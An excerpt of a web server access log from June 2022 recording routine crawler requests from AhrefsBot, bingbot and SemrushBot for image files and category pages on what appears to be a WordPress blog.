51.222.253.18 - - [27/Jun/2022:11:11:36 +0000] "GET /img_6534/ HTTP/2.0" 200 7869 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.17 - - [27/Jun/2022:11:11:39 +0000] "GET /wp-content/uploads/2014/01/IMG_6535-150x150.jpg HTTP/2.0" 200 28643 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.7 - - [27/Jun/2022:11:11:41 +0000] "GET /wp-content/uploads/2014/01/IMG_6533-150x150.jpg HTTP/2.0" 200 21387 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.19 - - [27/Jun/2022:11:11:44 +0000] "GET /wp-content/uploads/2014/01/IMG_6534.jpg HTTP/2.0" 200 868797 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
157.55.39.114 - - [27/Jun/2022:11:11:58 +0000] "GET /wp-content/uploads/2014/03/20140303-221322.jpg HTTP/2.0" 200 135007 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
51.222.253.10 - - [27/Jun/2022:11:13:36 +0000] "GET /node/category/rc/ HTTP/2.0" 200 8214 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.1 - - [27/Jun/2022:11:15:57 +0000] "GET /node/1731/img_7753/ HTTP/2.0" 200 7857 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.7 - - [27/Jun/2022:11:15:59 +0000] "GET /wp-content/uploads/2014/02/IMG_7750-150x150.png HTTP/2.0" 200 6177 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.3 - - [27/Jun/2022:11:16:00 +0000] "GET /wp-content/uploads/2014/02/IMG_7753.png HTTP/2.0" 200 68362 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.14 - - [27/Jun/2022:11:18:33 +0000] "GET /node/category/apache/ HTTP/2.0" 200 9778 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.18 - - [27/Jun/2022:11:18:33 +0000] "GET /img_6593 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.21 - - [27/Jun/2022:11:18:36 +0000] "GET /img_6593/ HTTP/1.1" 200 7921 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.2 - - [27/Jun/2022:11:19:53 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.8 - - [27/Jun/2022:11:19:54 +0000] "GET /node/category/font HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.22 - - [27/Jun/2022:11:19:57 +0000] "GET /node/category/font HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.35 - - [27/Jun/2022:11:19:59 +0000] "GET /node/category/font/ HTTP/1.1" 200 9444 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
51.222.253.8 - - [27/Jun/2022:11:20:48 +0000] "GET /img_7300/ HTTP/2.0" 200 7877 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
